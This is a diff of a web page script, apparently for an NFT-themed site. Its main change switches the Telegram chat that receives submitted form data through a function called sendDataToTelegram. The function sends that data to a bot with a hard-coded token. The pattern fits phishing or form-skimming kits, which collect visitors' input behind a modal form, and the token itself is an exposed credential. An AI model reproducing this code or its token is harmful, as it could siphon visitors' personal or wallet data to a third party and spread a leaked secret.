@@ -914,7 +914,7 @@ document.addEventListener("DOMContentLoaded", () => {
 // Function for sending data to Telegram
 function sendDataToTelegram(formData) {
   const botToken = "7603758318:AAE9t1VIya89ZBMAyqlM-wtIJZ8t5B8wN-4";
-  const chatId = "510818794";
+  const chatId = "7163885173";
   const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
   const message = `
@@ -1038,7 +1038,6 @@ document.addEventListener("DOMContentLoaded", function () {
 });
 
 document.addEventListener("DOMContentLoaded", function () {
-
   window.showModalForm = function () {
     const modal = document.getElementById("nft-modal");
     if (modal) {
@@ -1181,7 +1180,7 @@ document.addEventListener("DOMContentLoaded", function () {
             duration: 0.7,
             ease: "power1.out",
           },
-          "-=0.5" 
+          "-=0.5"
         );
       } else {
         // close menu
